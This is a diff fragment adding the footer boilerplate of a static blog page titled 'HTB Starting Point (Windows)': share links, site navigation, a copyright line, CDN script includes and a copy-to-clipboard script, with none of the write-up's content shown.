+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&name=HTB Starting Point (Windows)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&t=HTB Starting Point (Windows)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    wang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
